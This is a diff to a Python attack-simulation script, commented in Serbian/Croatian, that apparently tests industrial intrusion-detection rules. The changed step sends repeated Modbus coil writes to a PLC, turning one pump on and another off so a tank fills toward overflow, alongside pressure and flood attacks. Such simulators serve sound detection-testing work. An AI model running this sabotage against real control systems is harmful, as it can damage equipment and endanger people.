@@ -156,16 +156,18 @@ async def rampage():
     await pressure_attack()
     await asyncio.sleep(2)
 
-    # 4) Neovlasceni upisi u pumpe PLC1, BRZO (unutar dedup prozora 60s)
-    #    -> RULE-007 count raste. Namerno bez velikog razmaka.
-    print("[NAPADAC] Rafal neovlascenih upisa u pumpe (za count)...")
+    # 4) Sabotaza PLC1: upali pumpu1 (punjenje), ugasi pumpu2 (praznjenje)
+    #    -> nivo raste ka opasnom (prepun rezervoar). Isto kao ventil na PLC2,
+    #    samo drugi proces. Vise upisa BRZO -> RULE-007 count raste + WRITE_TO_DANGER.
+    print("[NAPADAC] Sabotaza PLC1: guram nivo ka prepunom (za count + korelaciju)...")
     client = AsyncModbusTcpClient(TARGET, port=502)
     await client.connect()
     if client.connected:
-        for i in range(5):
-            await client.write_coil(COIL_PUMPA1, i % 2 == 0)
-            print(f"[NAPADAC]   upis u pumpu {i+1}/5")
-            await asyncio.sleep(2)  # blizu -> dedup broji, count raste
+        for i in range(8):
+            await client.write_coil(COIL_PUMPA1, True)   # pumpa1 ON (puni)
+            await client.write_coil(COIL_PUMPA2, False)  # pumpa2 OFF (ne prazni)
+            print(f"[NAPADAC]   sabotaza nivoa {i+1}/8 (pumpa1 ON, pumpa2 OFF)")
+            await asyncio.sleep(3)  # nivo raste ~5%/s, za par upisa predje 95
         client.close()
 
     # 5) Flood (RULE-004)
